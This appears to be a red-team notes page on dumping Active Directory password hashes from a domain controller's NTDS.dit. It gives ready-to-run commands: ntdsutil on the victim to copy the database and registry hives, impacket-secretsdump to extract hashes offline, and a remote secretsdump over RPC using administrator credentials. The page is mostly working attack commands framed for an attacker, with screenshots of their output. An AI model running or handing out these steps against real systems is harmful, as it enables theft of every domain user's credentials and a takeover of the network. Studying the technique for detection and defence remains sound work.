---
description: Dumping NTDS.dit with Active Directory users hashes
---

# Dumping Domain Controller Hashes Locally and Remotely

## No Credentials

If you have no credentials, but you have access to the DC, it's possible to dump the ntds.dit using a lolbin ntdsutil.exe:

{% tabs %}
{% tab title="attacker@victim" %}
```bash
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
{% endtab %}
{% endtabs %}

We can see that the ntds.dit and SYSTEM as well as SECURITY registry hives are being dumped to c:\temp:

![](../../.gitbook/assets/ntdsutil-attacker.png)

We can then dump password hashes offline with impacket:

{% tabs %}
{% tab title="attacker@local" %}
```bash
root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```
{% endtab %}
{% endtabs %}

![](../../.gitbook/assets/ntds-hashdump%20%281%29.png)

## With Credentials

If you have credentials for an account that can log on to the DC, it's possible to dump hashes from NTDS.dit remotely via RPC protocol with impacket:

```text
impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
```

![](../../.gitbook/assets/image%20%28104%29.png)

## References

{% embed url="https://adsecurity.org/?p=2362" %}

{% embed url="https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-\(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM\)/" %}



